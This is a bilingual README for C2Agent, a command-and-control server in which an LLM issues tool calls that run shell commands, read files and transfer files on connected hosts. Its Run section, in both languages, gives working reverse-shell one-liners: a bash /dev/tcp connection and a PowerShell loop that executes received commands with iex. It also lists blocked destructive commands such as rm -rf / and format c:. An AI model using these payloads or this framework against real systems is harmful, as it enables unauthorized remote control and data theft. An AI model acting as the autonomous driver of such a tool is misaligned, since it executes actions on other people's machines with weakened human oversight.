# C2Agent

**中文** | [English](#english)

一个由 Go 编写的 C2（命令与控制）控制端：连接远程大模型 API（OpenAI 兼容，原生 Tool/Function Calling），
把模型的意图下发给受控端执行，并把结果回灌模型续轮。

A Go command-and-control control end that talks to an OpenAI-compatible LLM
(native tool/function calling) and dispatches the model's actions to controlled
ends, feeding results back to the model.

完整设计见 [`design.md`](./design.md)。 &nbsp;|&nbsp; Full design: [`design.md`](./design.md).

---

## 中文

### 1. 简介

C2Agent 是一个**控制端**（Go 单文件、纯 Go、无 CGO）。它同时支持两类受控端，**独立配置、独立端口、并存运行**：

| 类别 | 监听端口（默认） | 受控端 | 传输 | 鉴权 | 加密 |
| ---- | ---------------- | ------ | ---- | ---- | ---- |
| **Native 原生协议** | `8881` | `remote/remote-c`（C，推荐）、`remote/remote-go`（Go）或 `remote/remote-py`（Python） | 二进制协议（16B 头 + TLV） | 挑战-响应 | ChaCha20 |
| **Shell 反弹 Shell** | `8882` | 任意裸 shell（bash / nc / ncat / PowerShell） | 明文行 + `echo` marker 定界 | 无 | 无 |

控制端界面：**CLI** 与**浏览器 Web 面板**（内嵌单页，SSE 流式）。

### 2. 功能特性

- **LLM 原生工具调用**：使用官方库 `github.com/openai/openai-go`，兼容任意 OpenAI 兼容端点（Ollama / vLLM / DeepSeek / OpenAI）。
- **多 Agent + 多会话**：每个 Agent 可挂多个彼此独立的会话（各自历史、轮数、授权、停止）。
- **每 Agent 线性指令队列**：所有会话产生的动作/上传/下载/直连命令在同一 Agent 上按 FIFO 串行执行，
  结果**只回传发起它的会话**。**排队等待不超时；执行中受 `cmd_timeout` 限制。**
- **三级授权**：`0` N-Auto（全部需授权）、`1` H-Auto（低风险自动）、`2` F-Auto（全部自动）；
  授权通过会重置本轮轮数预算；拒绝则**不下发**该动作并结束本轮。
- **文件传输**：上传/下载统一落盘 `dl_temp_dir/<basename>`（重名覆盖）。
- **CLI + Web**：CLI 交互；Web 面板含 Agent 列表、会话列表、文件管理器、授权弹窗、授权模式滑块、深浅主题。
- **会话韧性**：会话在后台 goroutine 运行，页面刷新/断线不中断，重连后自动重放状态并继续流式接收。
- **纯 Go、无 CGO**：可交叉编译 Windows / Linux / macOS（amd64/arm64）单文件二进制。

### 3. 架构

```
                 控制端 C2（Go 单进程）
  ┌──────────────────────────────────────────────────────────────┐
  │  CLI            Web(net/http + SSE + go:embed 单页)           │
  │        └───────────────┬──────────────────────┘              │
  │                    Engine（多会话 / 授权 / 轮数 / 事件广播）    │
  │                        │                                      │
  │                  AgentRegistry（统一 Agent 视图 + 事件）        │
  │                        │ 每个 Agent 一条线性指令队列 dispatcher │
  │        ┌───────────────┴───────────────┐                      │
  │   NativeBackend                    ShellBackend               │
  │   NativeServer :8881               ShellServer :8882          │
  └────────┬───────────────────────────────────┬─────────────────┘
           │ 二进制协议 + ChaCha20              │ 明文行 + echo marker
      ┌────▼─────────┐                  ┌──────▼──────────────┐
      │ Native Agent │                  │ 裸反弹 Shell         │
      │ remote-c /   │                  │ bash / nc / pwsh     │
      │ remote-py    │                  └─────────────────────┘
      └──────────────┘
```

**一次 LLM 工具调用的数据流**：用户消息 → 该会话 goroutine → LLM（带 tools）→ 返回 `tool_calls`
→ 安全检查 → 授权判定 → 封装 Job 入该 Agent 队列（排队不超时）→ dispatcher 执行（受 `cmd_timeout`）
→ 结果写回本会话（`role=tool`）→ 回灌续轮（受 `round_limit`）。

### 4. 目录结构

```
C2Agent/
├── design.md                 # 完整设计文档
├── go.mod / go.sum           # Go module（c2agent）
├── config_c2.example.json    # C2 配置示例
├── cmd/c2agent/main.go       # 入口：--mode cli|web --config
├── internal/
│   ├── config/               # 配置加载/校验/默认值/目录解析
│   ├── protocol/             # 二进制协议常量 + 编解码 + PacketReader
│   ├── crypto/               # ChaCha20 + EncryptedConn
│   ├── agent/                # Agent 模型、Backend 接口、线性指令队列、Registry
│   │   ├── native/           # 原生协议 server + backend
│   │   └── shell/            # 反弹 shell server + backend + 命令构造
│   ├── command/              # 动作表（名称/参数/风险/安全检查/工具 schema 来源）
│   ├── llm/                  # openai-go 客户端 + tools schema
│   ├── engine/               # 多会话编排、授权、轮数、事件
│   ├── web/                  # net/http API + SSE + 内嵌前端
│   │   └── ui/index.html
│   └── cli/                  # 交互式命令行
├── remote/
│   ├── remote-c/             # C 受控端（自包含，gcc 编译）
│   ├── remote-go/            # Go 受控端（自包含，独立 go module）
│   ├── remote-py/            # Python 受控端源码
│   └── common/               # Python 共享协议/加密
└── build/                    # 交叉编译脚本（build_all.sh / build_all.bat）
```

### 5. 环境要求

- **控制端**：Go **1.22+**（纯 Go，无需 CGO）。
- **C 受控端（可选）**：`gcc` / MinGW-w64。
- **Go 受控端（可选）**：与控制端相同的 Go 工具链（`remote/remote-go` 为独立 module）。
- **Python 受控端（可选）**：Python 3.9+。
- 网络：受控端能访问 C2 的 `native.listen_port`（默认 8881）与/或 `shell.listen_port`（默认 8882）。

### 6. 第三方依赖（Go）

| 模块 | 版本 | 类型 | 说明 |
| ---- | ---- | ---- | ---- |
| `github.com/openai/openai-go` | v1.12.0 | 直接 | OpenAI 兼容 API 客户端（流式 chat completions + tools） |
| `github.com/tidwall/gjson` | v1.14.4 | 间接 | 上游依赖 |
| `github.com/tidwall/sjson` | v1.2.5 | 间接 | 上游依赖 |
| `github.com/tidwall/match` | v1.1.1 | 间接 | 上游依赖 |
| `github.com/tidwall/pretty` | v1.2.1 | 间接 | 上游依赖 |

> 全部为**纯 Go** 实现，不引入 CGO；协议与加密为项目内自实现（`internal/protocol`、`internal/crypto`）。
> C/Go/Python 受控端**零三方依赖**。

### 7. 编译

#### 7.1 本机编译

```bash
go build -o bin/c2agent ./cmd/c2agent
```

#### 7.2 交叉编译（纯 Go，`CGO_ENABLED=0`）

```bash
# POSIX
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o bin/c2agent_windows_amd64.exe ./cmd/c2agent
CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -o bin/c2agent_linux_amd64       ./cmd/c2agent
CGO_ENABLED=0 GOOS=darwin  GOARCH=arm64 go build -o bin/c2agent_darwin_arm64      ./cmd/c2agent

# 或用脚本一次产出全部目标（控制端 + Go 受控端，见 §7.6）
build/build_all.sh          # bash
build\build_all.bat         # Windows
```

#### 7.3 C 受控端

```bash
# Linux / macOS（心跳跑在线程上，链接 pthread）
gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lpthread
# Windows (MinGW-w64)
gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
```

#### 7.4 Python 受控端

已按当前目录布局调整导入：`remote/remote-py` 内为同级模块，`remote/common` 为共享包，无需任何额外配置，直接运行：

```bash
python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
```

> 需要 Python 3.9+；仅依赖标准库，无三方依赖。

#### 7.5 Go 受控端

```bash
cd remote/remote-go
go build -o c2agent_remote .                                   # 当前平台
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o c2agent_remote_linux_amd64 .   # 交叉编译
```

> `remote/remote-go` 是**独立 go module**（`module c2agent_remote`），零三方依赖；从仓库根执行 `go build ./...` 不会包含它。

#### 7.6 一次构建全部目标（控制端 + Go 受控端）

```bash
build/build_all.sh      # bash
build\build_all.bat     # Windows
```

产物在 `dist/`，全部为**静态编译、`CGO_ENABLED=0`、无外部运行时依赖**：

| 目标 | 控制端 | Go 受控端 |
| ---- | ------ | --------- |
| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/c2agent_remote_windows_amd64.exe` |
| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/c2agent_remote_windows_386.exe` |
| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/c2agent_remote_linux_amd64` |
| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/c2agent_remote_linux_386` |
| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/c2agent_remote_linux_arm64` |

> 说明：`linux_x86-64` 与 `linux_amd64` 若都指 64 位 x86 则为同一目标；上表额外提供了 32 位 x86（`386`）目标。

### 8. 运行

```bash
cp config_c2.example.json config_c2.json    # 填写 llm.api_base / api_key / model

# CLI（默认模式）
./bin/c2agent --config config_c2.json
# Web 面板：浏览器打开 http://127.0.0.1:8880
./bin/c2agent --mode web --config config_c2.json
```

**接入受控端 A（Native）**

```bash
# C（推荐）
./c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
# Go
./remote/remote-go/c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
# Python
python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
```

**接入受控端 B（反弹 Shell）**

```bash
# Linux
bash -c 'bash -i >& /dev/tcp/<C2_IP>/8882 0>&1'
# Windows (PowerShell 一行式；把 <C2_IP> 换成 C2 地址)
powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',8882);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::UTF8.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$sb=[Text.Encoding]::UTF8.GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

连上后，Web/CLI 中会同时出现 `server-01`（Native）与 `BOT-001`（Shell）。

> ⚠️ **`--agent-id` 必须每台受控端唯一**（如 `server-01`、`server-02`）。C2 以 agent_id 为键，同一 id 的新连接会顶掉旧连接（用于断线重连）；若两台机器共用同一 id，二者会互相顶掉并持续重连抖动。

### 9. 配置说明（`config_c2.json`）

| 分区 | 字段 | 说明 |
| ---- | ---- | ---- |
| `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM 接口；`system_prompt` 中 `{system_name}` 会被替换为目标 OS（提示词中**不出现** agent id/host） |
| `web` | `listen_host` / `listen_port` | Web 面板监听（默认 `127.0.0.1:8880`） |
| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | 原生协议监听；`enabled=true` 时 `auth_token` 必填且与受控端一致 |
| `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | 反弹 Shell 监听；`bot_prefix` 默认 `BOT-` |
| `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | 授权模式、轮数、执行超时、超时策略（`disconnect`/`fail`）、会话上限、队列容量 |
| `transfer` | `dl_temp_dir` / `ul_temp_dir` | 下载落盘目录（空 = `<cwd>/downloads`）、上传缓冲目录（空 = 系统临时目录） |

### 10. CLI 命令

| 命令 | 说明 |
| ---- | ---- |
| `/agents` | 列出已连接 Agent |
| `/target <id>` | 切换当前 Agent |
| `/sessions`、`/new [title]`、`/use <id\|index>`、`/close <id>` | 会话管理 |
| `/auth [0\|1\|2]` | 查看/切换授权模式（切换后即时重评估当前待授权动作） |
| `/reset` | 重置当前会话 |
| `/exec <command>` | 直接执行 shell 命令 |
| `/upload <local> <dest>` / `/download <src>` | 文件传输 |
| `/shutdown` | 关闭当前 Agent |
| `/help` / `/quit` | 帮助 / 退出 |

授权提示下输入：`/y` 允许、`/n` 拒绝、`/auth 0|1|2` 切换模式后重新评估。

### 11. Web 面板

- 顶栏：切换 Agent、授权模式、Command（直连命令）、Files（文件管理）、Controls（主题/授权/会话控制）。
- 左侧：**Agent 列表** + 其二**会话列表**（新建 / 切换 / 关闭，运行中显示状态）。
- 聊天区：SSE 流式输出、工具结果块、授权弹窗、停止/重置。
- 文件管理：真实绝对路径（经 `get_cwd` 解析）、进入目录、新建/删除/复制/移动、上传/下载。

主要接口：`/api/config`、`/api/agents`、`/api/agents/switch`、`/api/sessions*`、`/api/history`、
`/api/send`、`/api/chat-stream`(SSE)、`/api/set-auth`、`/api/authorize-execute`、`/api/stop`、`/api/reset`、
`/api/exec-cmd`、`/api/files/*`。

### 12. 线上协议（摘要）

**Native**：包头 16B = `request_id(uint64 LE)` + `body_len(uint32 LE)` + `reserved(3B)` + `cmd(1B)`。
请求包身 = TLV 链（`uint32 LE 长度 + UTF-8`）；响应包身 = 单一 UTF-8 字符串；
文件传输 1024B/数据包（`cmd` 字段作 `end_flag`：0 续传 / 1 末包）。
注册：`register(仅随机 nonce)` → `register_response(sha256(nonce+token))` → `register_confirm(身份，已加密)`；
其后全流量 ChaCha20，每连接的 key 与 nonce 均由握手 nonce 派生（一次一密）：
`key(dir)=sha256(nonce+token+nonce+dir)`、`nonce(dir)=sha256(token+nonce+token+dir)[:12]`
（`dir` 区分双向，`0x01`=C2→Agent，`0x02`=Agent→C2），counter 连续自增。
`read_file` 整文件读取截断 **51200 字符**。

**Shell**：明文单行命令 + `echo __C2AGENT_<hex>__` 定界；C2 探测 OS（`uname` / PowerShell / `sw_vers`）后编号 `BOT-XXX`；
所有动作转为单条 shell 命令；文件传输由 C2 端循环按偏移分段：受控端只执行「读取指定偏移一段并 base64 回传」或「base64 解码并追加到文件」，两端内存有界，大文件不再受单条命令长度限制。

### 13. 授权、轮数与队列

- **授权模式**：`0` N-Auto 全部需授权；`1` H-Auto 低风险（`get_cwd`/`list_dir`/`read_file`）自动、其余需授权；`2` F-Auto 全部自动。
- **轮数**：`round_limit` 限制单轮「LLM→动作→回灌」次数；**授权通过时清零**（拒绝不清零），任何模式都生效。
- **拒绝语义**：被拒动作**绝不下发**受控端，作为 tool 结果回灌后**结束本轮**。
- **指令队列**：每 Agent 一条 FIFO；**排队等待无超时**，**执行中受 `cmd_timeout`**。
- **执行超时语义**（`timeout_action`）：
  - `disconnect`（默认）：断开该 Agent，等待其重连。
  - `fail`：**保留连接**。当前 Job 报超时失败，并**清空该 Agent 的排队指令**；由于受控端上的命令可能仍在运行，C2 在它真正结束前（`Busy`）会拒绝新指令（直接报错、不再下发）。受控端返回后即可正常下发新指令。
    - **Native**：超时会重置该 Agent 的心跳计时（避免 watchdog 立即误踢），给一个 `native.heartbeat_timeout_sec` 的宽限窗口；若命令始终不返回，watchdog 到期仍会回收该 Agent。
    - **Shell**：无心跳/watchdog，若卡死命令永不返回，需由用户 `/shutdown` 关闭；关闭时会先写 `exit`，**1 秒内对端未关闭则强制断开连接**（Native 的 shutdown 同样带有 1 秒兜底强关）。
- **受控端并发**：Go / C 受控端将**心跳与指令执行分离到不同线程**（心跳独立发送，写操作按全局锁串行），因此执行长命令期间不会饿死心跳；执行超时按进程树终止，Go 另设 `WaitDelay` 兜底，C/Go 均启用 TCP keepalive。

### 14. 测试

```bash
go test ./...
```

覆盖：ChaCha20 RFC 7539 向量、协议编解码/半包粘包、Native 握手加密端到端、Shell marker 端到端、
队列超时语义、多会话/授权拒绝、Agent 列表稳定排序、快照 pending 序列化。

### 15. 安全与免责

- Native 使用挑战-响应鉴权 + ChaCha20 全流量加密；Shell 端口**无鉴权**，请仅在内网/VPN 使用。
- Web 面板默认仅监听 `127.0.0.1`；公网部署请加 SSH 隧道或反向代理 + 鉴权。
- 授权模式与安全检查（`rm -rf /`、`format c:`、`mkfs.` 等）用于降低风险，但非生产级防护。
- 安全检查与授权**仅作用于 LLM 生成的动作**；CLI/Web 中操作员的直连命令与文件操作不受约束（操作员即授权方）。
- Shell 受控端通过 `uname` / PowerShell / `sw_vers` 探测 OS；纯 `cmd.exe` 且无 PowerShell 的目标会被判为 Unknown 而无法使用。
- 本工具仅供个人/受信环境使用。

---

## English

### 1. Overview

C2Agent is a **control end** (single Go binary, pure Go, no CGO). It supports two
controlled-end families that **coexist with independent configuration and ports**:

| Family | Listener (default) | Controlled end | Transport | Auth | Encryption |
| ------ | ------------------ | -------------- | --------- | ---- | ---------- |
| **Native** | `8881` | `remote/remote-c` (C, recommended), `remote/remote-go` (Go), or `remote/remote-py` (Python) | binary protocol (16B header + TLV) | challenge-response | ChaCha20 |
| **Shell** | `8882` | any raw reverse shell (bash / nc / ncat / PowerShell) | plaintext lines + `echo` marker framing | none | none |

Interfaces: **CLI** and a **browser Web panel** (embedded single page, SSE streaming).

### 2. Features

- **Native tool calling** via the official `github.com/openai/openai-go`; works with any OpenAI-compatible endpoint (Ollama / vLLM / DeepSeek / OpenAI).
- **Multi-agent + multi-session** — each agent hosts several independent sessions (history, rounds, authorization, stop per session).
- **Per-agent linear command queue** — actions/uploads/downloads/direct commands from all sessions are serialized FIFO per agent; results are routed back to the originating session. **Queue wait has no timeout; execution is bounded by `cmd_timeout`.**
- **Three-level authorization** — `0` N-Auto (all), `1` H-Auto (low-risk auto), `2` F-Auto (none). An approval resets the round budget; a denial **never dispatches** the action and ends the turn.
- **File transfer** — uploads/downloads land in `dl_temp_dir/<basename>` (overwrite).
- **CLI + Web** — agent list, session list, file manager, authorization popup, auth-mode slider, light/dark themes.
- **Session resilience** — sessions run in background goroutines; page refresh/disconnect does not interrupt them, and a re-attach replays state and resumes the stream.
- **Pure Go, no CGO** — cross-compiles to Windows / Linux / macOS (amd64/arm64) single binaries.

### 3. Architecture

```
                 Control end C2 (single Go process)
  ┌──────────────────────────────────────────────────────────────┐
  │  CLI            Web (net/http + SSE + go:embed single page)    │
  │        └───────────────┬──────────────────────┘              │
  │                    Engine (multi-session / auth / rounds /    │
  │                            event broadcast)                   │
  │                        │                                      │
  │                  AgentRegistry (unified view + events)         │
  │                        │ one linear command queue per agent    │
  │        ┌───────────────┴───────────────┐                      │
  │   NativeBackend                    ShellBackend               │
  │   NativeServer :8881               ShellServer :8882          │
  └────────┬───────────────────────────────────┬─────────────────┘
           │ binary protocol + ChaCha20         │ plaintext + marker
      ┌────▼─────────┐                  ┌──────▼──────────────┐
      │ Native Agent │                  │ raw reverse shell    │
      │ remote-c /   │                  │ bash / nc / pwsh     │
      │ remote-py    │                  └─────────────────────┘
      └──────────────┘
```

**Data flow of one LLM tool call**: user message → that session's goroutine → LLM (with tools) → `tool_calls`
→ safety check → authorization decision → build a Job into the agent's queue (wait unbounded) →
dispatcher executes (bounded by `cmd_timeout`) → result written back to this session (`role=tool`) →
fed back to the model for the next round (bounded by `round_limit`).

### 4. Repository layout

```
C2Agent/
├── design.md                 # full design document
├── go.mod / go.sum           # Go module (c2agent)
├── config_c2.example.json    # C2 config example
├── cmd/c2agent/main.go       # entry: --mode cli|web --config
├── internal/
│   ├── config/               # config load/validate/defaults/dir resolution
│   ├── protocol/             # binary protocol constants + codec + PacketReader
│   ├── crypto/               # ChaCha20 + EncryptedConn
│   ├── agent/                # Agent model, Backend interface, linear queue, Registry
│   │   ├── native/           # native protocol server + backend
│   │   └── shell/            # reverse-shell server + backend + command builders
│   ├── command/              # action table (name/params/risk/safety; tool schema source)
│   ├── llm/                  # openai-go client + tools schema
│   ├── engine/               # multi-session orchestration, auth, rounds, events
│   ├── web/                  # net/http API + SSE + embedded frontend
│   │   └── ui/index.html
│   └── cli/                  # interactive CLI
├── remote/
│   ├── remote-c/             # C agent (self-contained, gcc)
│   ├── remote-go/            # Go agent (self-contained, own go module)
│   ├── remote-py/            # Python agent sources
│   └── common/               # Python shared protocol/crypto
└── build/                    # cross-compile scripts (build_all.sh / build_all.bat)
```

### 5. Requirements

- **Control end**: Go **1.22+** (pure Go, no CGO).
- **C agent (optional)**: `gcc` / MinGW-w64.
- **Go agent (optional)**: the same Go toolchain (`remote/remote-go` is an independent module).
- **Python agent (optional)**: Python 3.9+.
- Network: the agent must reach the C2's `native.listen_port` (default 8881) and/or `shell.listen_port` (8882).

### 6. Third-party dependencies (Go)

| Module | Version | Type | Notes |
| ------ | ------- | ---- | ----- |
| `github.com/openai/openai-go` | v1.12.0 | direct | OpenAI-compatible API client (streaming chat completions + tools) |
| `github.com/tidwall/gjson` | v1.14.4 | indirect | upstream dependency |
| `github.com/tidwall/sjson` | v1.2.5 | indirect | upstream dependency |
| `github.com/tidwall/match` | v1.1.1 | indirect | upstream dependency |
| `github.com/tidwall/pretty` | v1.2.1 | indirect | upstream dependency |

> All are **pure Go** (no CGO). The wire protocol and crypto are implemented in-repo
> (`internal/protocol`, `internal/crypto`). The C/Go/Python agents have **zero third-party dependencies**.

### 7. Build

#### 7.1 Native build

```bash
go build -o bin/c2agent ./cmd/c2agent
```

#### 7.2 Cross-compilation (pure Go, `CGO_ENABLED=0`)

```bash
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o bin/c2agent_windows_amd64.exe ./cmd/c2agent
CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -o bin/c2agent_linux_amd64       ./cmd/c2agent
CGO_ENABLED=0 GOOS=darwin  GOARCH=arm64 go build -o bin/c2agent_darwin_arm64      ./cmd/c2agent

# or build every target at once (see 7.6)
build/build_all.sh          # bash
build\build_all.bat         # Windows
```

#### 7.3 C agent

```bash
# Linux / macOS (heartbeat runs on a thread; link pthread)
gcc -O2 -Wall -Wextra -o c2agent_remote remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lpthread
# Windows (MinGW-w64)
gcc -O2 -Wall -Wextra -o c2agent_remote.exe remote/remote-c/protocol.c remote/remote-c/actions.c remote/remote-c/exec_cmd.c remote/remote-c/main.c -lws2_32
```

#### 7.4 Python agent

The imports have been adjusted to the current layout: `remote/remote-py` holds the
sibling modules and `remote/common` is the shared package, so no extra setup is needed:

```bash
python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
```

> Requires Python 3.9+; standard library only, no third-party dependencies.

#### 7.5 Go agent

```bash
cd remote/remote-go
go build -o c2agent_remote .                                  # current platform
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o c2agent_remote_linux_amd64 .  # cross-compile
```

> `remote/remote-go` is an **independent go module** (`module c2agent_remote`) with zero
> third-party deps; `go build ./...` from the repo root does not include it.

#### 7.6 Build all targets at once (control end + Go agent)

```bash
build/build_all.sh      # bash
build\build_all.bat     # Windows
```

Outputs land in `dist/`, all **statically compiled, `CGO_ENABLED=0`, no external runtime deps**:

| Target | Control end | Go agent |
| ------ | ----------- | -------- |
| win x86-64 | `dist/control/c2agent_windows_amd64.exe` | `dist/remote-go/c2agent_remote_windows_amd64.exe` |
| win x86 (32) | `dist/control/c2agent_windows_386.exe` | `dist/remote-go/c2agent_remote_windows_386.exe` |
| linux amd64 | `dist/control/c2agent_linux_amd64` | `dist/remote-go/c2agent_remote_linux_amd64` |
| linux x86 (32) | `dist/control/c2agent_linux_386` | `dist/remote-go/c2agent_remote_linux_386` |
| linux arm64 | `dist/control/c2agent_linux_arm64` | `dist/remote-go/c2agent_remote_linux_arm64` |

> Note: `linux_x86-64` and `linux_amd64` are the same target if both mean 64-bit x86;
> the table additionally provides the 32-bit x86 (`386`) target.

### 8. Run

```bash
cp config_c2.example.json config_c2.json    # fill in llm.api_base / api_key / model

# CLI (default mode)
./bin/c2agent --config config_c2.json
# Web panel: open http://127.0.0.1:8880
./bin/c2agent --mode web --config config_c2.json
```

**Connect a Native agent**

```bash
# C (recommended)
./c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
# Go
./remote/remote-go/c2agent_remote --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
# Python
python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 --auth-token <token>
```

**Connect a Shell bot**

```bash
# Linux
bash -c 'bash -i >& /dev/tcp/<C2_IP>/8882 0>&1'
# Windows (PowerShell one-liner; replace <C2_IP>)
powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',8882);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[Text.Encoding]::UTF8.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$sb=[Text.Encoding]::UTF8.GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

Registered agents appear as `server-01` (Native) and `BOT-001` (Shell).

> ⚠️ **`--agent-id` must be unique per controlled end** (e.g. `server-01`, `server-02`). The C2 keys agents by id and a new connection with an existing id replaces the old one (intended for reconnects); two hosts sharing one id will repeatedly evict each other.

### 9. Configuration reference (`config_c2.json`)

| Section | Fields | Notes |
| ------- | ------ | ----- |
| `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM endpoint; `{system_name}` in `system_prompt` is replaced with the OS (the prompt reveals **no** agent id/host) |
| `web` | `listen_host` / `listen_port` | Web panel listener (default `127.0.0.1:8880`) |
| `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | Native listener; when `enabled=true`, `auth_token` is required and must match the agent |
| `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | Reverse-shell listener; `bot_prefix` defaults to `BOT-` |
| `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | auth mode, rounds, execution timeout, timeout action (`disconnect`/`fail`), session cap, queue depth |
| `transfer` | `dl_temp_dir` / `ul_temp_dir` | download dir (empty = `<cwd>/downloads`), upload staging dir (empty = system temp) |

### 10. CLI commands

| Command | Description |
| ------- | ----------- |
| `/agents` | list connected agents |
| `/target <id>` | switch active agent |
| `/sessions`, `/new [title]`, `/use <id\|index>`, `/close <id>` | manage sessions |
| `/auth [0\|1\|2]` | show/set authorization mode (switching re-evaluates the pending action immediately) |
| `/reset` | reset the active session |
| `/exec <command>` | run a shell command directly |
| `/upload <local> <dest>` / `/download <src>` | file transfer |
| `/shutdown` | shut down the active agent |
| `/help` / `/quit` | help / exit |

At an authorization prompt: `/y` allow, `/n` deny, `/auth 0|1|2` switch mode and re-evaluate.

### 11. Web panel

- Top bar: agent switch, auth mode, Command (direct shell), Files (file manager), Controls (theme/auth/session).
- Left: **agent list** + the agent's **session list** (new / switch / close, with running state).
- Chat: SSE streaming, tool-result blocks, authorization popup, stop/reset.
- File manager: real absolute path (resolved via `get_cwd`), navigate, create/delete/copy/move, upload/download.

Main endpoints: `/api/config`, `/api/agents`, `/api/agents/switch`, `/api/sessions*`, `/api/history`,
`/api/send`, `/api/chat-stream` (SSE), `/api/set-auth`, `/api/authorize-execute`, `/api/stop`, `/api/reset`,
`/api/exec-cmd`, `/api/files/*`.

### 12. Wire protocol (summary)

**Native**: header 16B = `request_id(uint64 LE)` + `body_len(uint32 LE)` + `reserved(3B)` + `cmd(1B)`.
Request body = TLV chain (`uint32 LE length + UTF-8`); response body = a single UTF-8 string;
file transfer uses 1024-byte data packets (`cmd` byte becomes `end_flag`: 0 continue / 1 last).
Registration: `register(random nonce only)` → `register_response(sha256(nonce+token))` →
`register_confirm(identity, encrypted)`; afterwards the whole stream uses ChaCha20, where each
connection's key and nonce are derived from the handshake nonce (one-time key+nonce):
`key(dir)=sha256(nonce+token+nonce+dir)`, `nonce(dir)=sha256(token+nonce+token+dir)[:12]`
(`dir` separates the directions: `0x01`=C2→Agent, `0x02`=Agent→C2), with a continuous counter.
Whole-file `read_file` is truncated to **51200 chars**.

**Shell**: plaintext single-line command framed by `echo __C2AGENT_<hex>__`; the C2 probes the OS
(`uname` / PowerShell / `sw_vers`) and assigns `BOT-XXX`; every action becomes one shell command;
file transfer is streamed by the control end in offset-based segments (the shell bot only reads a
range and base64-encodes it, or base64-decodes and appends a chunk), so both ends stay bounded.

### 13. Authorization, rounds and the queue

- **Auth modes**: `0` N-Auto (all need approval); `1` H-Auto (low-risk `get_cwd`/`list_dir`/`read_file` auto, rest need approval); `2` F-Auto (all auto).
- **Rounds**: `round_limit` caps the "LLM → action → feedback" loop; an **approval resets** it (a denial does not), in every mode.
- **Denial semantics**: the denied action is **never dispatched**; it is fed back as a tool result and the **turn ends**.
- **Command queue**: one FIFO per agent; **queue wait is unbounded**, **execution is bounded by `cmd_timeout`**.
- **Execution-timeout semantics** (`timeout_action`):
  - `disconnect` (default): drop the agent and wait for it to reconnect.
  - `fail`: **keep the connection**. The current job fails with a timeout and the agent's **queued jobs are discarded**; while the command may still be running, new jobs are rejected (reported as busy, not dispatched) until the controlled end finishes.
    - **Native**: the timeout resets the agent's heartbeat timer (so the watchdog does not drop it immediately), granting one `native.heartbeat_timeout_sec` grace window; if the command never returns, the watchdog still reclaims the agent.
    - **Shell**: no heartbeat/watchdog — if a stuck command never returns, the user must `/shutdown`; shutdown writes `exit` and **force-closes the connection after 1s** if the peer does not close (Native shutdown has the same 1s force-close fallback).
- **Controlled-end concurrency**: the Go / C agents run **heartbeats on a separate thread from command execution** (all writes serialized by a global lock), so a long command cannot starve heartbeats; timeouts kill the whole process tree, Go sets `WaitDelay`, and both enable TCP keepalive.

### 14. Tests

```bash
go test ./...
```

Covers: ChaCha20 RFC 7539 vectors, protocol codec / half & coalesced packets, native handshake+encryption
end-to-end, shell marker end-to-end, queue timeout semantics, multi-session / denial, stable agent ordering,
and snapshot pending serialization.

### 15. Security & disclaimer

- Native uses challenge-response auth + full-stream ChaCha20. The shell listener is **unauthenticated** — use it only on a trusted network/VPN.
- The Web panel binds to `127.0.0.1` by default; for public exposure add an SSH tunnel or reverse proxy + auth.
- Authorization modes and safety checks (`rm -rf /`, `format c:`, `mkfs.`, ...) reduce risk but are not production-grade protection.
- Safety checks and authorization apply to **LLM-generated actions only**; an operator's direct commands and file operations from the CLI/Web are not constrained (the operator is the authorizer).
- Shell bots probe the OS via `uname` / PowerShell / `sw_vers`; a pure `cmd.exe` host without PowerShell is reported as Unknown and unusable.
- For personal / trusted-environment use only.
